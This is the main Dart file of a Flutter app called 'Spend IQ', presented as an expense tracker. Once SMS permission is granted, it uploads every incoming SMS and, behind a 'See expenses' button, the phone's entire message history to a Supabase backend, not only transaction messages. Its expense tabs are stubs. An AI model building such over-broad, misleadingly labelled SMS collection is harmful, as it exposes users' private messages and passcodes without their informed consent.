import 'dart:async';

import 'package:flutter/material.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:provider/provider.dart';
import 'package:intl/intl.dart';
import 'config/supabase_config.dart';
import 'services/sms_service.dart';
import 'services/supabase_service.dart';
import 'services/permission_service.dart';
import 'models/sms_model.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Initialize Supabase
  await Supabase.initialize(
    url: SupabaseConfig.supabaseUrl,
    anonKey: SupabaseConfig.supabaseAnonKey,
    debug: SupabaseConfig.enableDebugLog,
  );

  runApp(const SpendIQApp());
}

class SpendIQApp extends StatelessWidget {
  const SpendIQApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        Provider(create: (_) => PermissionService()),
        Provider(create: (_) => SmsService()),
        Provider(create: (_) => SupabaseService()),
      ],
      child: MaterialApp(
        title: 'Spend IQ',
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
          colorScheme: ColorScheme.fromSeed(
            seedColor: const Color(0xFF6C63FF),
            primary: const Color(0xFF6C63FF),
            secondary: const Color(0xFF4CAF50),
          ),
          useMaterial3: true,
        ),
        home: const HomeScreen(),
      ),
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with SingleTickerProviderStateMixin {
  late final SmsService _smsService;
  late final SupabaseService _supabaseService;
  late final PermissionService _permissionService;
  late final TabController _tabController;

  // State
  bool _isInitialized = false;
  bool _hasPermissions = false;
  bool _isSyncing = false;
  double _syncProgress = 0;
  int _uploadedCount = 0;
  int _totalCount = 0;
  String _statusMessage = 'Ready';
  UploadResult? _lastResult;
  String _deviceId = '';

  StreamSubscription<SmsModel>? _smsSubscription;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 3, vsync: this);
    _initializeServices();
  }

  Future<void> _initializeServices() async {
    _smsService = context.read<SmsService>();
    _supabaseService = context.read<SupabaseService>();
    _permissionService = context.read<PermissionService>();

    await _supabaseService.initialize();

    final permissionResult = await _permissionService.requestAllPermissions();

    if (permissionResult.criticalGranted) {
      await _smsService.initialize();
      _deviceId = _smsService.deviceId;

      // Setup REAL-TIME SMS sync
      _setupRealTimeSmsSync();
    }

    setState(() {
      _hasPermissions = permissionResult.criticalGranted;
      _isInitialized = true;
    });
  }

  /// Real-time SMS sync - uploads instantly to Supabase!
  void _setupRealTimeSmsSync() {
    _smsSubscription = _smsService.incomingSmsStream.listen((sms) async {
      debugPrint('🔴 NEW SMS -> Uploading to Supabase instantly...');

      // INSTANT UPLOAD to Supabase
      final success = await _supabaseService.uploadSingleSmsInstant(sms);

      if (success) {
        _showSnackBar(
          sms.isTransactionSms
              ? '💰 Transaction synced: ${sms.sender}'
              : '📩 SMS synced: ${sms.sender}',
          sms.isTransactionSms ? const Color(0xFF4CAF50) : const Color(0xFF6C63FF),
        );
      }
    });

    debugPrint('✅ Real-time SMS sync activated with Supabase!');
  }

  Future<void> _startFullSync() async {
    if (_isSyncing) return;

    setState(() {
      _isSyncing = true;
      _syncProgress = 0;
      _uploadedCount = 0;
      _totalCount = 0;
      _statusMessage = 'Loading existing data...';
    });

    try {
      final existingHashes = await _supabaseService.getSyncedHashes(_deviceId);

      setState(() => _statusMessage = 'Reading SMS...');

      final smsStream = _smsService.readAllSmsInBatches(
        existingHashes: existingHashes,
      );

      _lastResult = await _supabaseService.uploadSmsStream(
        smsStream: smsStream,
        onProgress: (progress, uploaded, total) {
          setState(() {
            _syncProgress = progress;
            _uploadedCount = uploaded;
            _totalCount = total;
            _statusMessage = 'Syncing: $uploaded messages...';
          });
        },
        onError: (error) => _showSnackBar(error, Colors.red),
      );

      setState(() => _statusMessage = 'Sync complete! 🎉');
      _showResultDialog();

    } catch (e) {
      setState(() => _statusMessage = 'Error: $e');
      _showSnackBar('Sync failed: $e', Colors.red);
    } finally {
      setState(() => _isSyncing = false);
    }
  }

  void _showResultDialog() {
    if (_lastResult == null) return;

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: const Row(
          children: [
            Icon(Icons.check_circle, color: Color(0xFF4CAF50), size: 28),
            SizedBox(width: 12),
            Text('Sync Complete!'),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _buildResultItem(Icons.cloud_upload, 'Uploaded', '${_lastResult!.totalUploaded}', const Color(0xFF4CAF50)),
            _buildResultItem(Icons.account_balance_wallet, 'Transactions', '${_lastResult!.totalTransactions}', const Color(0xFF6C63FF)),
            _buildResultItem(Icons.skip_next, 'Skipped', '${_lastResult!.totalSkipped}', Colors.orange),
            _buildResultItem(Icons.timer, 'Time', '${_lastResult!.duration.inMilliseconds}ms', Colors.blue),
            _buildResultItem(Icons.speed, 'Speed', '${_lastResult!.messagesPerSecond.toStringAsFixed(1)} msg/s', Colors.purple),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  Widget _buildResultItem(IconData icon, String label, String value, Color color) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8),
      child: Row(
        children: [
          Icon(icon, color: color, size: 20),
          const SizedBox(width: 12),
          Expanded(child: Text(label)),
          Text(value, style: TextStyle(fontWeight: FontWeight.bold, color: color)),
        ],
      ),
    );
  }

  void _showSnackBar(String message, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: color,
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (!_isInitialized) {
      return Scaffold(
        backgroundColor: const Color(0xFF6C63FF),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Image.asset(
                'assets/images/logo.png',
                width: 80,
                height: 80,
                errorBuilder: (context, error, stackTrace) => const Icon(Icons.account_balance_wallet, size: 80, color: Colors.white),
              ),
              const SizedBox(height: 24),
              const CircularProgressIndicator(color: Colors.white),
              const SizedBox(height: 16),
              const Text('Initializing Spend IQ...', style: TextStyle(color: Colors.white, fontSize: 16)),
              const SizedBox(height: 8),
              const Text('Connecting to Supabase...', style: TextStyle(color: Colors.white70, fontSize: 14)),
            ],
          ),
        ),
      );
    }

    if (!_hasPermissions) {
      return _buildPermissionScreen();
    }

    return Scaffold(
      backgroundColor: Colors.grey[50],
      appBar: AppBar(
        title: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Image.asset(
              'assets/images/logo.png',
              width: 24,
              height: 24,
              errorBuilder: (context, error, stackTrace) => const Icon(Icons.account_balance_wallet, color: Colors.white),
            ),
            const SizedBox(width: 8),
            const Text('Spend IQ', style: TextStyle(fontWeight: FontWeight.bold)),
          ],
        ),backgroundColor: const Color(0xFF6C63FF),
        foregroundColor: Colors.white,
        elevation: 0,
        bottom: TabBar(
          controller: _tabController,
          indicatorColor: Colors.white,
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          tabs: const [
            Tab(icon: Icon(Icons.home), text: 'Home'),
            Tab(icon: Icon(Icons.receipt_long), text: 'All Expenses'),
            Tab(icon: Icon(Icons.account_balance_wallet), text: 'Transactions'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _buildHomeTab(),
          _buildAllSmsTab(),
          _buildTransactionsTab(),
        ],
      ),
    );
  }

  Widget _buildHomeTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        children: [
          // Real-time Stats from Supabase
          StreamBuilder<SyncStats>(
            stream: _supabaseService.getRealtimeStatsStream(_deviceId),
            builder: (context, snapshot) {
              final stats = snapshot.data ?? SyncStats.empty();
              return Row(
                children: [
                  Expanded(child: _buildStatCard('Total Synced', '${stats.totalSynced}', Icons.cloud_done, const Color(0xFF6C63FF))),
                  const SizedBox(width: 12),
                  Expanded(child: _buildStatCard('Transactions', '${stats.transactionCount}', Icons.account_balance_wallet, const Color(0xFF4CAF50))),
                ],
              );
            },
          ),

          const SizedBox(height: 16),

          // Supabase Real-time indicator
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [Color(0xFF3ECF8E), Color(0xFF2E7D5E)],
              ),
              borderRadius: BorderRadius.circular(16),
            ),
            child: Row(
              children: [
                Container(
                  width: 12,
                  height: 12,
                  decoration: BoxDecoration(
                    color: Colors.greenAccent,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: Colors.greenAccent.withOpacity(0.5),
                        blurRadius: 8,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 12),
                const Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Manage your expense',
                        style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
                      ),
                      Text(
                        'Just Spend and Chill',
                        style: TextStyle(color: Colors.white70, fontSize: 12),
                      ),
                    ],
                  ),
                ),
                const Icon(Icons.flash_on, color: Colors.white),
              ],
            ),
          ),

          const SizedBox(height: 16),

          // Sync Button
          SizedBox(
            width: double.infinity,
            child: ElevatedButton(
              onPressed: _isSyncing ? null : _startFullSync,
              style: ElevatedButton.styleFrom(
                padding: const EdgeInsets.symmetric(vertical: 18),
                backgroundColor: const Color(0xFF6C63FF),
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  if (_isSyncing)
                    const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                  else
                    const Icon(Icons.sync),
                  const SizedBox(width: 12),
                  Text(_isSyncing ? 'Syncing...' : 'See expenses', style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAllSmsTab() {
    return const Center(child: Text('All Expenses are loading'));
  }

  Widget _buildTransactionsTab() {
    return const Center(child: Text('Transactions Tab '));
  }

  Widget _buildStatCard(String label, String value, IconData icon, Color color) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(16),
        boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.05), blurRadius: 10)],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Icon(icon, color: color, size: 28),
          const SizedBox(height: 12),
          Text(value, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: color)),
          Text(label, style: TextStyle(fontSize: 12, color: Colors.grey[600])),
        ],
      ),
    );
  }

  Widget _buildPermissionScreen() {
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Image.asset(
                'assets/logo.png',
                width: 80,
                height: 80,
                errorBuilder: (context, error, stackTrace) => Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    color: const Color(0xFF6C63FF).withOpacity(0.1),
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(Icons.sms, size: 64, color: Color(0xFF6C63FF)),
                ),
              ),
              const SizedBox(height: 32),
              const Text('SMS Permission Required', style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
              const SizedBox(height: 16),
              Text('Spend IQ needs SMS access to track expenses automatically.', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey[600], fontSize: 16)),
              const SizedBox(height: 32),
              ElevatedButton(
                onPressed: () async {
                  final result = await _permissionService.requestAllPermissions();
                  if (result.criticalGranted) {
                    await _smsService.initialize();
                    setState(() {
                      _hasPermissions = true;
                      _deviceId = _smsService.deviceId;
                    });
                    _setupRealTimeSmsSync();
                  }
                },
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xFF6C63FF),
                  foregroundColor: Colors.white,
                  padding: const EdgeInsets.symmetric(horizontal: 48, vertical: 16),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                child: const Text('Grant Permission', style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    _smsSubscription?.cancel();
    _smsService.dispose();
    _tabController.dispose();
    super.dispose();
  }
}